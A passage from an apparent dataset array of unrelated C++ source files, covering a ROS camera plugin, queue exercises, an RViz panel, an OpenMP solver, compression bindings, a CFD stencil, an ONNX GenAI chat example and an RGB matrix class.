found\");\n      return;\n    }\n    if (!this->camera_sensor_)\n    {\n      RCLCPP_ERROR(this->ros_node_->get_logger(), \"Camera sensor not found\");\n      return;\n    }\n    \n    // Activate the camera sensor\n    this->camera_sensor_->SetActive(true);\n    this->depth_camera_sensor_->SetActive(true);\n\n    this->depth_connection_ = this->depth_camera_sensor_->DepthCamera()->ConnectNewDepthFrame(\n      std::bind(&ObjectCameraPlugin::OnNewDepthFrame, this, std::placeholders::_1, \n                std::placeholders::_2, std::placeholders::_3, std::placeholders::_4, \n                std::placeholders::_5)\n    );\n    this->connection_ = this->camera_sensor_->Camera()->ConnectNewImageFrame(\n      std::bind(&ObjectCameraPlugin::OnNewFrame, this, std::placeholders::_1, \n                std::placeholders::_2, std::placeholders::_3, std::placeholders::_4, \n                std::placeholders::_5)\n    );\n\n    this->image_pub_ = this->ros_node_->create_publisher<sensor_msgs::msg::Image>(\"/camera/image_raw\", 10);\n    this->polygon_stamped_pub_ = this->ros_node_->create_publisher<geometry_msgs::msg::PolygonStamped>(\"/camera/polygon_stamped\", 10);\n    RCLCPP_INFO(this->ros_node_->get_logger(), \"Object Camera Plugin loaded.\");\n  }\n\n\n  void ObjectCameraPlugin::OnNewDepthFrame(const float *depth_image, unsigned int width, unsigned int height, \n                                         unsigned int depth, const std::string &format)\n  {\n    // Store the depth image for later use in the RGB image processing\n    this->depth_image_ = cv::Mat(height, width, CV_32FC1, const_cast<float*>(depth_image));\n  }\n\n  void ObjectCameraPlugin::OnNewFrame(const unsigned char *image, unsigned int width, unsigned int height, \n                                      unsigned int depth, const std::string &format)\n  {\n    // Convert the image to an OpenCV format\n    cv::Mat cv_image(height, width, CV_8UC3, const_cast<unsigned char*>(image));\n\n    //------------------------Functions for object detection or segmentation, can integrate neuron network here--------------------------------------------------------\n\n    // convert the image to HSV format\n    cv::Mat hsv_image;\n    cv::cvtColor(cv_image, hsv_image, cv::COLOR_RGB2HSV); \n    // define the color range for the grass\n    cv::Scalar lower_green(35, 40, 40);\n    cv::Scalar upper_green(102, 255, 255);  \n    // Threshold the HSV image to get only th",
    "#include <iostream>\r\nusing namespace std;\r\n\r\n// Node class representing each node in the queue\r\nclass Node {\r\npublic:\r\n    int data;\r\n    Node* next;\r\n\r\n    Node(int value) {\r\n        data = value;\r\n        next = nullptr;\r\n    }\r\n};\r\n\r\n// Queue class using linked lists\r\nclass Queue {\r\nprivate:\r\n    Node* front;\r\n    Node* rear;\r\n\r\npublic:\r\n    Queue() {\r\n        front = nullptr;\r\n        rear = nullptr;\r\n    }\r\n\r\n    ~Queue() {\r\n        while (!IsEmpty()) {\r\n            Dequeue();\r\n        }\r\n    }\r\n\r\n    // Function to check if the queue is empty\r\n    bool IsEmpty() {\r\n        return front == nullptr;\r\n    }\r\n\r\n    // Function to enqueue an element to the queue\r\n    void Enqueue(int value) {\r\n        Node* newNode = new Node(value);\r\n        if (rear) {\r\n            rear->next = newNode;\r\n        } else {\r\n            front = newNode; // If the queue was empty\r\n        }\r\n        rear = newNode;\r\n    }\r\n\r\n    // Function to dequeue an element from the queue\r\n    int Dequeue() {\r\n        if (IsEmpty()) {\r\n            throw std::out_of_range(\"Queue is empty.\");\r\n        }\r\n        Node* temp = front;\r\n        int value = front->data;\r\n        front = front->next;\r\n\r\n        // If the queue becomes empty, also reset rear\r\n        if (front == nullptr) {\r\n            rear = nullptr;\r\n        }\r\n        delete temp;\r\n        return value;\r\n    }\r\n\r\n    // Function to check if the queue is full (not applicable for linked lists)\r\n    bool IsFull() {\r\n        return false; // A linked list based queue is never full unless memory is exhausted\r\n    }\r\n};\r\n\r\n// Menu-driven main function\r\nint main() {\r\n    Queue queue;\r\n    int choice;\r\n\r\n    do {\r\n        cout << \"\\nQueue Menu:\\n\";\r\n        cout << \"1. Enqueue\\n\";\r\n        cout << \"2. Dequeue\\n\";\r\n        cout << \"3. Check if the queue is empty\\n\";\r\n        cout << \"4. Check if the queue is full\\n\";\r\n        cout << \"5. Exit\\n\";\r\n        cout << \"Enter your choice: \";\r\n        cin >> choice;\r\n\r\n        switch (choice) {\r\n            case 1: {\r\n                int value;\r\n                cout << \"Enter the value to enqueue: \";\r\n                cin >> value;\r\n                queue.Enqueue(value);\r\n                cout << value << \" enqueued successfully.\\n\";\r\n                break;\r\n            }\r\n            case 2: {\r\n                try {\r\n                    int dequeuedValue = queue.Dequeue();\r\n                    cout << dequeuedValue << \" dequeued successfully.\\n\";\r\n                } catch (const std::out_of_range& e) {\r\n                    cout << e.what() << endl;\r\n                }\r\n                break;\r\n            }\r\n            case 3: {\r\n                cout << (queue.IsEmpty() ? \"Queue is empty.\" : \"Queue is not empty.\") << endl;\r\n                break;\r\n            }\r\n            case 4: {\r\n                cout << (queue.IsFull() ? \"Queue is full.\" : \"Queue is not full.\") << endl;\r\n                break;\r\n            }\r\n            case 5: {\r\n                cout << \"Exiting the program.\\n\";\r\n                break;\r\n            }\r\n            default:\r\n                cout << \"Invalid choice. Please try again.\\n\";\r\n        }\r\n    } while (choice != 5);\r\n\r\n    return 0;\r\n}\r\n/* At FontBath Bank, a solitary teller attends to a lengthy line of customers. New patrons enter\r\nthe queue at its rear, and the teller will assist a customer only if they possess all the necessary\r\ndocumentation. Construct a representation of this queue, noting that 25% of the time, a\r\ncustomer\u2019s paperwork may be insufficient, resulting in their return to the end of the queue.\r\nIllustrate what the bank\u2019s lobby scenario would resemble over the course of several minutes.*/ \r\n#include <iostream>\r\n#include <ctime>    // For time()\r\n#include <cstdlib>  // For rand() and srand()\r\n#include <unordered_map>  // To track customer failures\r\n\r\nusing namespace std;\r\n\r\n// Node structure for linked list queue\r\nstruct Node {\r\n    int data;      // Customer ID\r\n    Node* next;\r\n\r\n    Node(int d) : data(d), next(nullptr) {}\r\n};\r\n\r\n// Custom Queue Class\r\nclass Queue {\r\nprivate:\r\n    Node* front; // Points to the first customer in the queue\r\n    Node* rear;  // Points to the last customer in the queue\r\n\r\npublic:\r\n    Queue() : front(nullptr), rear(nullptr) {}\r\n\r\n    // Enqueue: Add a customer to the end of the queue\r\n    void enqueue(int data) {\r\n        Node* newNode = new Node(data);\r\n        if (rear == nullptr) {\r\n            front = rear = newNode;\r\n        } else {\r\n            rear->next = newNode;\r\n            rear = newNode;\r\n        }\r\n    }\r\n\r\n    // Dequeue: Remove a customer from the front of the queue\r\n    int dequeue() {\r\n        if (isEmpty()) {\r\n            cout << \"Queue is empty! Cannot dequeue.\\n\";\r\n            return -1;\r\n        }\r\n        Node* temp = front;\r\n        int data = temp->data;\r\n        front = front->next;\r\n\r\n        if (front == nullptr) rear = nullptr;\r\n\r\n        delete temp;\r\n        return data;\r\n    }\r\n\r\n    // Check if the queue is empty\r\n    bool isEmpty() {",
    "#include \"curobo_rviz/curobo_rviz.hpp\"\n\nnamespace curobo_rviz\n{\n  RvizArgsPanel::RvizArgsPanel(QWidget *parent)\n    : Panel{parent}\n    , ui_(std::make_unique<Ui::gui>())\n    , node_{nullptr}\n    , max_attempts_{0}\n    , timeout_{0.0}\n    , time_dilation_factor_{0.0}\n  {\n    // Extend the widget with all attributes and children from UI file\n    ui_->setupUi(this);\n\n    // Init rclcpp node\n    auto options = rclcpp::NodeOptions().arguments(\n        {\"--ros-args\", \"--remap\", \"__node:=rviz_push_button_node\", \"--\"});\n    node_ = std::make_shared<rclcpp::Node>(\"_\", options);\n\n    // Prepare msg\n    msg_.data = true;\n\n    // Connect SpinBox and DoubleSpinBox to slots\n    connect(ui_->spinBox_1, SIGNAL(valueChanged(int)), this, SLOT(updateMaxAttempts(int)));\n    connect(ui_->doubleSpinBox_1, SIGNAL(valueChanged(double)), this, SLOT(updateTimeout(double)));\n    connect(ui_->doubleSpinBox_2, SIGNAL(valueChanged(double)), this, SLOT(updateTimeDilationFactor(double)));\n  }\n\n  RvizArgsPanel::~RvizArgsPanel()\n  {\n  }\n    void RvizArgsPanel::load(const rviz_common::Config &config)\n    {\n      Panel::load(config);\n      int max_attempts;\n      float timeout, time_dilation;\n\n      if (max_attempts = config.mapGetInt(\"max_attempts\", &max_attempts))\n      {\n        ui_->spinBox_1->setValue(max_attempts);\n      }\n\n      if (timeout = config.mapGetFloat(\"timeout\", &timeout))\n      {\n        ui_->doubleSpinBox_1->setValue(timeout);\n      }\n\n      if (time_dilation = config.mapGetFloat(\"time_dilation_factor\", &time_dilation))\n      {\n          ui_->doubleSpinBox_2->setValue(time_dilation);\n      }\n    }\n\n    void RvizArgsPanel::save(rviz_common::Config config) const\n    {\n      Panel::save(config);\n      config.mapSetValue(\"max_attempts\", max_attempts_);\n      config.mapSetValue(\"timeout\", timeout_);\n      config.mapSetValue(\"time_dilation_factor\", time_dilation_factor_);\n    }\n\n    void RvizArgsPanel::updateMaxAttempts(int value)\n    {\n        max_attempts_ = value;\n        RCLCPP_INFO(node_->get_logger(), \"Max attempts set to %d\", max_attempts_);\n    }\n\n    void RvizArgsPanel::updateTimeout(double value)\n    {\n        timeout_ = value;\n        RCLCPP_INFO(node_->get_logger(), \"Timeout set to %.2f\", timeout_);\n    }\n\n    void RvizArgsPanel::updateTimeDilationFactor(double value)\n    {\n        time_dilation_factor_ = value;\n        RCLCPP_INFO(node_->get_logger(), \"Time dilation factor set to %.2f\", time_dilation_factor_);\n    }\n\n} // curobo_rviz\n\n#include <pluginlib/class_list_macros.hpp>\nPLUGINLIB_EXPORT_CLASS(curobo_rviz::RvizArgsPanel, rviz_common::Panel)",
    "#include \"src/auxility.hpp\"\n#include \"src/linear.hpp\"\n#include \"src/openmp.hpp\"\n#include <chrono>\n#include <filesystem>\n#include <fstream>\n#include <iomanip>\n#include <iostream>\n#include <omp.h>\n\nint main() {\n\n  // Specify the name of the directory to create in the build folder\n  const std::string buildFolder =\n      \".\"; // Replace with your build folder path if needed\n  const std::string dirName =\n      \"output\"; // Change this to your desired directory name\n  const std::filesystem::path dirPath =\n      std::filesystem::path(buildFolder) / dirName;\n\n  // Check if the directory already exists\n  if (!std::filesystem::exists(dirPath)) {\n    // Create the directory\n    if (std::filesystem::create_directory(dirPath)) {\n      std::cout << \"Reports are stored in: \" << dirPath << std::endl;\n    } else {\n      std::cerr << \"Failed to create directory: \" << dirPath << std::endl;\n    }\n  } else {\n    std::cout << \"Reports are stored in: \" << dirPath << std::endl;\n  }\n  auto NMs = {std::pair<int, int>(10, 10), std::pair<int, int>(20, 20),\n              std::pair<int, int>(40, 40)};\n\n  int maxIterations = 1e5;\n  double tolerance = 1e-6;\n\n  for (auto &[N, M] : NMs) {\n    // Example matrices (a, b, F) initialized with some values\n    std::vector<std::vector<double>> a(M, std::vector<double>(N - 1, 0.0));\n    std::vector<std::vector<double>> b(M - 1, std::vector<double>(N, 0.0));\n    std::vector<std::vector<double>> F(M - 1, std::vector<double>(N - 1, 0.0));\n    std::vector<std::vector<double>> W(M + 1, std::vector<double>(N + 1, 0.0));\n\n    std::string fileName =\n        \"linear_\" + std::to_string(M) + '_' + std::to_string(N) + \".txt\";\n\n    std::ofstream solutionFile(dirPath / fileName);\n\n    auto begin = std::chrono::high_resolution_clock::now();\n    linear::computeA(a);\n    linear::computeB(b);\n    linear::computeF(F);\n    linear::calculateW(a, b, F, W, maxIterations, tolerance);\n    // After function call\n    auto stop = std::chrono::high_resolution_clock::now();\n    auto duration =\n        std::chrono::duration_cast<std::chrono::microseconds>(stop - begin);\n    solutionFile << \"Solution (\" << N << \",\" << M << \")\"\n                 << \" Linear took \" << duration.count() << \" microsecs:\\n\\n\";\n    // Output the result\n    for (int i = 0; i <= M; i++) {\n      for (int j = 0; j <= N; j++) {\n        solutionFile << std::fixed << std::setprecision(4) << W[i][j] << \" \";\n      }\n      solutionFile << std::endl;\n    }\n    solutionFile.close();\n\n    // Back to default values\n    for (int i = 0; i < M - 1; ++i) {\n      std::fill(b[i].begin(), b[i].end(), 0.0);\n      std::fill(F[i].begin(), F[i].end(), 0.0);\n    }\n    for (int i = 0; i < M; ++i) {\n      std::fill(a[i].begin(), a[i].end(), 0.0);\n    }\n    for (int i = 0; i < M + 1; ++i) {\n      std::fill(W[i].begin(), W[i].end(), 0.0);\n    }\n  }\n\n  // // printABF(a, b, F);\n  // // std::cout << \"\\n\\n\\n\";\n\n  int N = 40, M = 40;\n  for (auto threadNum : {1, 4, 16}) {\n    // Example matrices (a, b, F) initialized with some values\n    std::vector<std::vector<double>> a(M, std::vector<double>(N - 1, 0.0));\n    std::vector<std::vector<double>> b(M - 1, std::vector<double>(N, 0.0));\n    std::vector<std::vector<double>> F(M - 1, std::vector<double>(N - 1, 0.0));\n    std::vector<std::vector<double>> W(M + 1, std::vector<double>(N + 1, 0.0));\n\n    auto fileName = \"openmp_\" + std::to_string(M) + '_' + std::to_string(N) +\n                    \"_TN\" + std::to_string(threadNum) + \".txt\";\n\n    std::ofstream solutionFile(dirPath / fileName);\n\n    auto start = omp_get_wtime();\n    computeJointABF(a, b, F, threadNum);\n    calculateW(a, b, F, W, maxIterations, tolerance, threadNum);\n    auto end = omp_get_wtime();\n    // Output the result\n    solutionFile << std::fixed << \"Solution (\" << N << \",\" << M << \")\"\n                 << \" OpenMP took (\" << threadNum << \" threads) \"\n                 << static_cast<uint>((end - start) * 1e6) << \" microsecs:\\n\\n\";\n    for (int i = 0; i <= M; i++) {\n      for (int j = 0; j <= N; j++) {\n        solutionFile << std::fixed << std::setprecision(4) << W[i][j] << \" \";\n      }\n      solutionFile << std::endl;\n    }\n    solutionFile.close();\n\n    // Back to default values\n    for (int i = 0; i < M - 1; ++i) {\n      std::fill(b[i].begin(), b[i].end(), 0.0);\n      std::fill(F[i].begin(), F[i].end(), 0.0);\n    }\n    for (int i = 0; i < M; ++i) {\n      std::fill(a[i].begin(), a[i].end(), 0.0);\n    }\n    for (int i = 0; i < M + 1; ++i) {\n      std::fill(W[i].begin(), W[i].end(), 0.0);\n    }\n  }\n  return 0;\n}",
    "// C bindings for the compression_utils library\n\n#include \"compression_utils.h\"\n#include \"compression_utils_func.hpp\"\n\n#include <cstdint>\n#include <cstdlib>\n#include <cstring>\n#include <span>\n#include <stdexcept>\n#include <vector>\n\nextern \"C\" {\n\n// Compression function implementation\nint64_t compress_data(const uint8_t* data, size_t size, uint8_t** output, Algorithm algorithm,\n                      int level) {\n    try {\n        // Call the C++ Compress function\n        std::vector<uint8_t> compressed_data = compression_utils::Compress(\n            data, size, static_cast<compression_utils::Algorithm>(algorithm), level);\n\n        // Allocate memory for the output buffer\n        *output = static_cast<uint8_t*>(malloc(compressed_data.size()));\n\n        // Return -1 if memory allocation fails\n        if (*output == nullptr) {\n            return -1;\n        }\n\n        // Copy the compressed data to the output buffer\n        memcpy(*output, compressed_data.data(), compressed_data.size());\n\n        // Return the size of the compressed data\n        return static_cast<int64_t>(compressed_data.size());\n    } catch (const std::exception& e) {\n        // Handle any exceptions thrown by the C++ code and return -1 to indicate failure\n        return -1;\n    }\n}\n\n// Decompression function implementation\nint64_t decompress_data(const uint8_t* data, size_t size, uint8_t** output, Algorithm algorithm) {\n    try {\n        // Call the C++ Decompress function\n        std::vector<uint8_t> decompressed_data = compression_utils::Decompress(\n            data, size, static_cast<compression_utils::Algorithm>(algorithm));\n\n        // Allocate memory for the output buffer\n        *output = static_cast<uint8_t*>(malloc(decompressed_data.size()));\n\n        // Return -1 if memory allocation fails\n        if (*output == nullptr) {\n            return -1;\n        }\n\n        // Copy the decompressed data to the output buffer\n        memcpy(*output, decompressed_data.data(), decompressed_data.size());\n\n        // Return the size of the decompressed data\n        return static_cast<int64_t>(decompressed_data.size());\n    } catch (const std::exception& e) {\n        // Handle any exceptions thrown by the C++ code and return -1 to indicate failure\n        return -1;\n    }\n}\n\n}  // extern \"C\"\n",
    "#include <iostream>\n#include <cstring>\n#include \"Donation.h\"\n\nusing namespace std;\n\nDonation::Donation() {\n    strcpy_s(D_ref_no, sizeof(D_ref_no), \"\"); \n    strcpy_s(name, sizeof(name), \"\");\n    strcpy_s(phoneNo, sizeof(phoneNo), \"\");\n    strcpy_s(email, sizeof(email), \"\");\n    strcpy_s(amount, sizeof(amount), \"\");\n    regUser = nullptr;\n}\n\nDonation::Donation(const char d_ref[], const char d_name[], const char d_phone[], const char d_email[], const char d_amount[], Registered_user* user) {\n    strcpy_s(D_ref_no, sizeof(D_ref_no), d_ref);\n    strcpy_s(name, sizeof(name), d_name);\n    strcpy_s(phoneNo, sizeof(phoneNo), d_phone);\n    strcpy_s(email, sizeof(email), d_email);\n    strcpy_s(amount, sizeof(amount), d_amount);\n    regUser = user;\n}\n\nvoid Donation::setDonationDetails(const char d_ref[], const char d_name[], const char d_phone[], const char d_email[], const char d_amount[]) {\n    strcpy_s(D_ref_no, sizeof(D_ref_no), d_ref);\n    strcpy_s(name, sizeof(name), d_name);\n    strcpy_s(phoneNo, sizeof(phoneNo), d_phone);\n    strcpy_s(email, sizeof(email), d_email);\n    strcpy_s(amount, sizeof(amount), d_amount);\n}\n\nvoid Donation::showDonationDetails() {\n    cout << \"Donation Reference No: \" << D_ref_no << endl;\n    cout << \"Donor Name: \" << name << endl;\n    cout << \"Phone No: \" << phoneNo << endl;\n    cout << \"Email: \" << email << endl;\n    cout << \"Amount: \" << amount << endl;\n\n    if (regUser != nullptr) {\n        cout << \"Registered User ID: \" << regUser->getUserID() << endl;\n    }\n}\n\nDonation::~Donation() {\n    cout << \"Donation with reference \" << D_ref_no << \" is being deleted.\" << endl;\n}\n",
    "#include \"StdAfx.hpp\"\n\n#include \"BFStepInitStencil.hpp\"\n\nStencils::BFStepInitStencil::BFStepInitStencil(const Parameters& parameters):\n  FieldStencil<FlowField>(parameters),\n  xLimit_(parameters.bfStep.xRatio * parameters.geometry.lengthX),\n  yLimit_(parameters.bfStep.yRatio * parameters.geometry.lengthY) {}\n\nvoid Stencils::BFStepInitStencil::apply(FlowField& flowField, int i, int j) {\n  IntScalarField& flags  = flowField.getFlags();\n  const RealType  posX   = parameters_.meshsize->getPosX(i, j);\n  const RealType  posY   = parameters_.meshsize->getPosY(i, j);\n  const RealType  dx     = parameters_.meshsize->getDx(i, j);\n  const RealType  dy     = parameters_.meshsize->getDy(i, j);\n  const RealType  nextDx = parameters_.meshsize->getDx(i + 1, j);\n  const RealType  nextDy = parameters_.meshsize->getDy(i, j + 1);\n  const RealType  lastDx = parameters_.meshsize->getDx(i - 1, j);\n  const RealType  lastDy = parameters_.meshsize->getDy(i, j - 1);\n\n  if (posX + 0.5 * dx < xLimit_ && posY + 0.5 * dy < yLimit_) {\n    flags.getValue(i, j) = OBSTACLE_SELF;\n  }\n  if (posX - 0.5 * lastDx < xLimit_ && posY + 0.5 * dy < yLimit_) {\n    flags.getValue(i, j) += OBSTACLE_LEFT;\n  }\n  if (posX + dx + 0.5 * nextDx < xLimit_ && posY + 0.5 * dy < yLimit_) {\n    flags.getValue(i, j) += OBSTACLE_RIGHT;\n  }\n  if (posX + 0.5 * dx < xLimit_ && posY - 0.5 * lastDy < yLimit_) {\n    flags.getValue(i, j) += OBSTACLE_BOTTOM;\n  }\n  if (posX + 0.5 * dx < xLimit_ && posY + dy + 0.5 * nextDy < yLimit_) {\n    flags.getValue(i, j) += OBSTACLE_TOP;\n  }\n}\n\nvoid Stencils::BFStepInitStencil::apply(FlowField& flowField, int i, int j, int k) {\n  IntScalarField& flags  = flowField.getFlags();\n  const RealType  posX   = parameters_.meshsize->getPosX(i, j, k);\n  const RealType  posY   = parameters_.meshsize->getPosY(i, j, k);\n  const RealType  dx     = parameters_.meshsize->getDx(i, j, k);\n  const RealType  dy     = parameters_.meshsize->getDy(i, j, k);\n  const RealType  nextDx = parameters_.meshsize->getDx(i + 1, j, k);\n  const RealType  nextDy = parameters_.meshsize->getDy(i, j + 1, k);\n  const RealType  lastDx = parameters_.meshsize->getDx(i - 1, j, k);\n  const RealType  lastDy = parameters_.meshsize->getDy(i, j - 1, k);\n\n  if (posX + 0.5 * dx < xLimit_ && posY + 0.5 * dy < yLimit_) {\n    flags.getValue(i, j, k) = OBSTACLE_SELF;\n    // The obstacle is 2D, so we can say the following:\n    flags.getValue(i, j, k) += OBSTACLE_FRONT;\n    flags.getValue(i, j, k) += OBSTACLE_BACK;\n  }\n  if (posX - 0.5 * lastDx < xLimit_ && posY + 0.5 * dy < yLimit_) {\n    flags.getValue(i, j, k) += OBSTACLE_LEFT;\n  }\n  if (posX + dx + 0.5 * nextDx < xLimit_ && posY + 0.5 * dy < yLimit_) {\n    flags.getValue(i, j, k) += OBSTACLE_RIGHT;\n  }\n  if (posX + 0.5 * dx < xLimit_ && posY - 0.5 * lastDy < yLimit_) {\n    flags.getValue(i, j, k) += OBSTACLE_BOTTOM;\n  }\n  if (posX + 0.5 * dx < xLimit_ && posY + dx + 0.5 * nextDy < yLimit_) {\n    flags.getValue(i, j, k) += OBSTACLE_TOP;\n  }\n}\n",
    "// Copyright (c) Microsoft Corporation. All rights reserved.\n// Licensed under the MIT License.\n\n#include <cassert>\n#include <chrono>\n#include <iomanip>\n#include <iostream>\n#include <string>\n#include \"ort_genai.h\"\n\nusing Clock = std::chrono::high_resolution_clock;\nusing TimePoint = std::chrono::time_point<Clock>;\nusing Duration = std::chrono::duration<double>;\n\n// `Timing` is a utility class for measuring performance metrics.\nclass Timing {\n public:\n  Timing(const Timing&) = delete;\n  Timing& operator=(const Timing&) = delete;\n\n  Timing() = default;\n\n  ~Timing() = default;\n\n  void RecordStartTimestamp() {\n    assert(start_timestamp_.time_since_epoch().count() == 0);\n    start_timestamp_ = Clock::now();\n  }\n\n  void RecordFirstTokenTimestamp() {\n    assert(first_token_timestamp_.time_since_epoch().count() == 0);\n    first_token_timestamp_ = Clock::now();\n  }\n\n  void RecordEndTimestamp() {\n    assert(end_timestamp_.time_since_epoch().count() == 0);\n    end_timestamp_ = Clock::now();\n  }\n\n  void Log(const int prompt_tokens_length, const int new_tokens_length) {\n    assert(start_timestamp_.time_since_epoch().count() != 0);\n    assert(first_token_timestamp_.time_since_epoch().count() != 0);\n    assert(end_timestamp_.time_since_epoch().count() != 0);\n\n    Duration prompt_time = (first_token_timestamp_ - start_timestamp_);\n    Duration run_time = (end_timestamp_ - first_token_timestamp_);\n\n    const auto default_precision{std::cout.precision()};\n    std::cout << std::endl;\n    std::cout << \"-------------\" << std::endl;\n    std::cout << std::fixed << std::showpoint << std::setprecision(2)\n              << \"Prompt length: \" << prompt_tokens_length << \", New tokens: \" << new_tokens_length\n              << \", Time to first: \" << prompt_time.count() << \"s\"\n              << \", Prompt tokens per second: \" << prompt_tokens_length / prompt_time.count() << \" tps\"\n              << \", New tokens per second: \" << new_tokens_length / run_time.count() << \" tps\"\n              << std::setprecision(default_precision) << std::endl;\n    std::cout << \"-------------\" << std::endl;\n  }\n\n private:\n  TimePoint start_timestamp_;\n  TimePoint first_token_timestamp_;\n  TimePoint end_timestamp_;\n};\n\n// C++ API Example\n\nvoid CXX_API(const char* model_path) {\n  std::cout << \"Creating model...\" << std::endl;\n  auto model = OgaModel::Create(model_path);\n  std::cout << \"Creating tokenizer...\" << std::endl;\n  auto tokenizer = OgaTokenizer::Create(*model);\n  auto tokenizer_stream = OgaTokenizerStream::Create(*tokenizer);\n\n  while (true) {\n    std::string text;\n    std::cout << \"Prompt: (Use quit() to exit)\" << std::endl;\n    std::getline(std::cin, text);\n\n    if (text == \"quit()\") {\n      break;  // Exit the loop\n    }\n\n    const std::string prompt = \"<|user|>\\n\" + text + \"<|end|>\\n<|assistant|>\";\n\n    bool is_first_token = true;\n    Timing timing;\n    timing.RecordStartTimestamp();\n\n    auto sequences = OgaSequences::Create();\n    tokenizer->Encode(prompt.c_str(), *sequences);\n\n    std::cout << \"Generating response...\" << std::endl;\n    auto params = OgaGeneratorParams::Create(*model);\n    params->SetSearchOption(\"max_length\", 1024);\n    params->SetInputSequences(*sequences);\n\n    auto generator = OgaGenerator::Create(*model, *params);\n\n    while (!generator->IsDone()) {\n      generator->ComputeLogits();\n      generator->GenerateNextToken();\n\n      if (is_first_token) {\n        timing.RecordFirstTokenTimestamp();\n        is_first_token = false;\n      }\n\n      // Show usage of GetOutput\n      std::unique_ptr<OgaTensor> output_logits = generator->GetOutput(\"logits\");\n\n      // Assuming output_logits.Type() is float as it's logits\n      // Assuming shape is 1 dimensional with shape[0] being the size\n      auto logits = reinterpret_cast<float*>(output_logits->Data());\n\n      // Print out the logits using the following snippet, if needed\n      //auto shape = output_logits->Shape();\n      //for (size_t i=0; i < shape[0]; i++)\n      //   std::cout << logits[i] << \" \";\n      //std::cout << std::endl;\n\n      const auto num_tokens = generator->GetSequenceCount(0);\n      const auto new_token = generator->GetSequenceData(0)[num_tokens - 1];\n      std::cout << tokenizer_stream->Decode(new_token) << std::flush;\n    }\n\n    timing.RecordEndTimestamp();\n    const int prompt_tokens_length = sequences->SequenceCount(0);\n    const int new_tokens_length = generator->GetSequenceCount(0) - prompt_tokens_length;\n    timing.Log(prompt_tokens_length, new_tokens_length);\n\n    for (int i = 0; i < 3; ++i)\n      std::cout << std::endl;\n  }\n}\n\n// C API Example\n\nvoid CheckResult(OgaResult* result) {\n  if (result) {\n    std::string string = OgaResultGetError(result);\n    OgaDestroyResult(result);\n    throw std::runtime_error(string);\n  }\n}\n\nvoid C_API(const char* model_path) {\n  OgaModel* model;\n  std::cout << \"Creating model...\" << std::endl;\n  OgaCreateModel(model_path, &model);\n\n  OgaTokenizer* tokenizer;\n  std::cout << \"Creating tokenizer...\" << std::endl;\n  CheckResult(OgaCreat",
    "#include \"matrix/rgb_matrix.h\"\n\n#include <iomanip>\n#include <iostream>\n#include <tuple>\n\nRGBMatrix::RGBMatrix()\n    : Matrix(0, 0, 3)\n{\n}\n\nRGBMatrix::RGBMatrix(const RGBMatrix &mat)\n    : Matrix(mat)\n{\n}\nRGBMatrix::RGBMatrix(size_t rows, size_t cols)\n    : Matrix(rows, cols, 3)\n{\n}\n\nRGBMatrix::RGBMatrix(size_t rows, size_t cols, int init_val)\n    : Matrix(rows, cols, 3, init_val)\n{\n}\n\nvoid RGBMatrix::print() const\n{\n    std::cout << *this << std::endl; // this / *this?\n}\n\nvoid RGBMatrix::fromOpenCV(const cv::Mat &mat)\n{\n    if (mat.channels() != 3 || mat.depth() != CV_8U)\n    {\n        return;\n    }\n\n    rows_count_ = mat.rows;\n    columns_count_ = mat.cols;\n    data_.resize(mat.total() * mat.channels());\n\n    for (size_t r = 0; r < rows_count_; ++r)\n    {\n        for (size_t c = 0; c < columns_count_; ++c)\n        {\n            auto val = mat.at<cv::Vec3b>(r, c);\n            at(r, c, 0) = val[2];\n            at(r, c, 1) = val[1];\n            at(r, c, 2) = val[0];\n        }\n    }\n}\n\ncv::Mat RGBMatrix::toOpenCV() const\n{\n    cv::Mat mat(rows_count_, columns_count_, CV_8UC3);\n\n    for (size_t r = 0; r < rows_count_; ++r)\n    {\n        for (size_t c = 0; c < columns_count_; ++c)\n        {\n            cv::Vec3b val;\n            val[0] = at(r, c, 2);\n            val[1] = at(r, c, 1);\n            val[2] = at(r, c, 0);\n            mat.at<cv::Vec3b>(r, c) = val;\n        }\n    }\n    return mat;\n}\n\nbool RGBMatrix::readImage(const std::string &path)\n{\n    cv::Mat rgbImage = cv::imread(path, cv::IMREAD_COLOR);\n    if (rgbImage.empty())\n    {\n        return false;\n    }\n    fromOpenCV(rgbImage);\n    return true;\n}\n\nvoid RGBMatrix::draw(const Shape &shape)\n{\n    auto color = shape.getColor().getRGB();\n    auto points = shape.getPoints();\n    for (size_t i = 0; i < points.size(); ++i)\n    {\n        int x = points[i].x;\n        int y = points[i].y;\n        if (x < 0 || y < 0 || x > columns_count_ || y > rows_count_)\n        {\n            continue;\n        }\n        at(y, x, 0) = std::get<0>(color);\n        at(y, x, 1) = std::get<1>(color);\n        at(y, x, 2) = std::get<2>(color);\n    }\n}\n\nBWMatrix RGBMatrix::toBW() const\n{\n    BWMatrix res(rows_count_, columns_count_);\n    for (size_t r = 0; r < rows_count_; ++r)\n    {\n        for (size_t c = 0; c < columns_count_; ++c)\n        {\n            int gray = (at(r, c, 0) + at(r, c, 1) + at(r, c, 2)) / 3;\n            res.at(r, c) = gray;\n        }\n    }\n    return res;\n}\n\nRGBMatrix &RGBMatrix::operator=(const RGBMatrix &mat)\n{\n    Matrix::operator=(mat);\n    return *this;\n}\n\nstd::ostream &operator<<(std::ostream &out, const Matrix &mat)\n{\n    if (mat.getRows() == 0 || mat.getCols() == 0)\n    {\n        out << \"(An empty matrix)\" << std::endl;\n        return out;\n    }\n\n    static const std::vector<std::string> names = {\"R\", \"G\", \"B\"};\n    for (size_t row = 0; row < mat.getRows(); ++row)\n    {\n        for (size_t col = 0; col < mat.getCols(); ++col)\n        {\n            out << (col > 0 ? \" \" : \"\") << std::setw(2);\n            out << \"(\";\n            for (size_t channel = 0; channel < mat.getChannels(); ++channel)\n            {\n                out << (channel > 0 ? \", \" : \"\") << std::setw(4);\n                out << names[channel] << \": \" << mat.at(row, col, channel);\n            }\n            out << \")\";\n        }\n        out << std::endl;\n    }\n    return out;\n}\n\nRGBMatrix RGBMatrix::add(int val) const\n{\n    RGBMatrix res(rows_count_, columns_count_, channels_count_);\n    Matrix::add(res, val);\n    return res;\n}\n\nRGBMatrix RGBMatrix::subtract(int val) const\n{\n    RGBMatrix res(rows_count_, columns_count_, channels_count_);\n    Matrix::subtract(res, val);\n    return res;\n}\n\nRGBMatrix RGBMatrix::multiply(int val) const\n{\n    RGBMatrix res(rows_count_, columns_count_, channels_count_);\n    Matrix::multiply(res, val);\n    return res;\n}\n\nRGBMatrix RGBMatrix::operator+(int val) const\n{\n    return add(val);\n}\n\nRGBMatrix RGBMatrix::operator-(int val) const\n{\n    return subtract(val);\n}\n\nRGBMatrix RGBMatrix::operator*(int val) const\n{\n    return 